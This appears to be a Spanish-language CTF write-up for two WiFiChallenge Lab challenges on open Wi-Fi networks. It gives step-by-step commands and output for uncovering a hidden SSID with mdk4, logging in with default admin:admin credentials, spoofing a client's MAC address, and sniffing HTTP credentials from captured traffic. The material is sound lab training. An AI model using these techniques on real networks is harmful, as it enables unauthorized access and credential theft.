---
layout: post
title: "WifiChallengeLab - Wi-Fi - OPN (Redes Públicas Abiertas)"
categories: wifi
---

> Red inalámbrica que no tiene cifrado ni contraseña para conectarse.

## WiFiChallenge Lab - Challenge 5 - ¿Cuál es la FLAG en el router del AP oculto tras unas credenciales por defecto?

- Primero vamos a identificar la red Oculta.

```bash
root@WiFiChallengeLab:/home/user# airodump-ng wlan0mon --band abg
```

- Si observamos vemos que la red es oculta.

<p align="center">
<img src="https://i.imgur.com/EG761Rv.png">
</p>

- Vamos a ver como se llama haciendo un ataque de fuerza bruta usando **MDK4** <https://www.kali.org/tools/mdk4/> es una herramienta de auditoría y pruebas de redes inalámbricas. Es una evolución de MDK3 y está diseñada para atacar redes Wi-Fi de diversas maneras, explotando vulnerabilidades y debilidades en la seguridad de estas redes. MDK4 puede realizar una amplia variedad de ataques, incluidos ataques de denegación de servicio (DoS), ataques de desautenticación, ataques de reinyección de paquetes y muchos otros.

```bash
root@WiFiChallengeLab:/home/user# iwconfig wlan0mon channel 11
```

- Una vez operando en la antena en el canal donde esta el AP oculto vamos a proceder a hacer el ataque de fuerza bruta con el diccionario que tenemos en el laboratorio.

```bash
root@WiFiChallengeLab:/home/user# mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt 
Waiting for a beacon frame from target to get its SSID length.
SSID length is 9
Trying SSID: wifi-love                                           
Packets sent:      1 - Speed:    1 packets/sec
Probe Response from target AP with SSID wifi-*****                
Job's done, have a nice day :)
```

- Como es una red abierta y ya tenemos el nombre simplemente podemos conectarnos y obtener IP.

```bash
root@WiFiChallengeLab:/home/user# cat zi.conf 
network={
    ssid="wifi-****"
    key_mgmt=NONE
    scan_ssid=1
}
```

- Ahora nos conectamos.

```bash
root@WiFiChallengeLab:/home/user# wpa_supplicant -iwlan2 -c zi.conf 
Successfully initialized wpa_supplicant
wlan2: SME: Trying to authenticate with f0:9f:c2:6a:88:26 (SSID='wifi-****' freq=2462 MHz)
wlan2: Trying to associate with f0:9f:c2:6a:88:26 (SSID='wifi-****' freq=2462 MHz)
wlan2: Associated with f0:9f:c2:6a:88:26
wlan2: CTRL-EVENT-CONNECTED - Connection to f0:9f:c2:6a:88:26 completed [id=0 id_str=]
```

- Ahora obtenemos IP.

```bash
root@WiFiChallengeLab:/home/user# dhclient wlan2 -v
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan2/02:00:00:00:02:00
Sending on   LPF/wlan2/02:00:00:00:02:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 3 (xid=0x63f8fc4b)
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 6 (xid=0x63f8fc4b)
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 15 (xid=0x63f8fc4b)
DHCPOFFER of 192.168.16.84 from 192.168.16.1
DHCPREQUEST for 192.168.16.84 on wlan2 to 255.255.255.255 port 67 (xid=0x4bfcf863)
DHCPACK of 192.168.16.84 from 192.168.16.1 (xid=0x63f8fc4b)
bound to 192.168.16.84 -- renewal in 41788 seconds.
```

- Ahora nos vamos al navegador para ver el sitio web.

<p align="center">
<img src="https://i.imgur.com/eh99OYj.png">
</p>

- Si recordamos nos decian que las credenciales son por defecto si intentamos con admin:admin que es lo mas comun vemos que nos deja entrar y obtenemos la flag del reto.

<p align="center">
<img src="https://i.imgur.com/b93ISXY.png">
</p>

## WiFiChallenge Lab - Challenge 6 - ¿Cuál es la FLAG en el router AP de la red wifi-guest?

- Tenemos cliente conectados al AP.

```bash
root@WiFiChallengeLab:/home/user# airodump-ng wlan0mon --band abg -c6 -w capturaopn
```

<p align="center">
<img src="https://i.imgur.com/oRE5hb7.png">
</p>

- Al ser una red abierta podemos suplantar la MAC de un cliente y conectarnos.

```bash
root@WiFiChallengeLab:/home/user# sudo systemctl stop NetworkManager
root@WiFiChallengeLab:/home/user# ip link set wlan2 down
root@WiFiChallengeLab:/home/user# macchanger -m B0:72:BF:44:B0:49 wlan2
Current MAC:   b0:72:bf:44:b0:49 (unknown)
Permanent MAC: 02:00:00:00:02:00 (unknown)
New MAC:       b0:72:bf:44:b0:49 (unknown)
It's the same MAC!!
```

- Ahora creamos el archivo de configuración.

```bash
root@WiFiChallengeLab:/home/user# cat zi.conf 
network={
    ssid="wifi-guest"
    key_mgmt=NONE
    scan_ssid=1
}
```

- Ahora nos conectamos.

```bash
root@WiFiChallengeLab:/home/user# wpa_supplicant -iwlan2 -c zi.conf 
Successfully initialized wpa_supplicant
wlan2: SME: Trying to authenticate with f0:9f:c2:71:22:10 (SSID='wifi-guest' freq=2437 MHz)
wlan2: Trying to associate with f0:9f:c2:71:22:10 (SSID='wifi-guest' freq=2437 MHz)
wlan2: Associated with f0:9f:c2:71:22:10
wlan2: CTRL-EVENT-CONNECTED - Connection to f0:9f:c2:71:22:10 completed [id=0 id_str=]
wlan2: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
```

- Ahora nos asignamos IP.

```bash
root@WiFiChallengeLab:/home/user# dhclient wlan2 -v
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan2/b0:72:bf:44:b0:49
Sending on   LPF/wlan2/b0:72:bf:44:b0:49
Sending on   Socket/fallback
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 3 (xid=0xacf3240)
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 7 (xid=0xacf3240)
DHCPOFFER of 192.168.10.14 from 192.168.10.1
DHCPREQUEST for 192.168.10.14 on wlan2 to 255.255.255.255 port 67 (xid=0x4032cf0a)
DHCPACK of 192.168.10.14 from 192.168.10.1 (xid=0xacf3240)
bound to 192.168.10.14 -- renewal in 38293 seconds.
```

- Pero vemos que es un panel de autenticación y no tenemos credenciales.

<p align="center">
<img src="https://i.imgur.com/7PuOkhl.png">
</p>

- Como no tenemos credenciales pero estamos ante una red publica vamos a examinar nuestra captura .cap que exportamos mientras escaneamos para ver si viajo alguna credencial cuando estabamos monitoreando.

- Vemos una credencial si filtramos por trafico **http**.

<p align="center">
<img src="https://i.imgur.com/mSZByth.png">
</p>

- Vemos que funcionan y vemos la flag.

<p align="center">
<img src="https://i.imgur.com/xvlfoeU.png">
</p>

> Las redes OPN no cifran el tráfico entre el dispositivo del usuario y el punto de acceso. Esto permite a los atacantes espiar el tráfico de la red para capturar datos no cifrados, como nombres de usuario, contraseñas y actividad de navegación.
